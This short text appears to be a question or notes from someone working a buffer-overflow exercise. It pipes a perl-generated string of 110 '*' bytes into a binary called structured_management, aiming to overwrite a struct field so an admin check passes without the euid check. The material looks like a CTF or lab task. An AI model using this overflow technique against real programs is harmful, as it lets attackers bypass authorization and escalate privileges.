perl -e 'print "\x2a"x110' > out.txt
cat out.txt | ./structured_management 
I'm using the perl to create the input ,and execute the program.
I'm trying to overwrite the value of user._100_4 to 0x2a so that even if I don't pass euid check, it will still pass the admin check.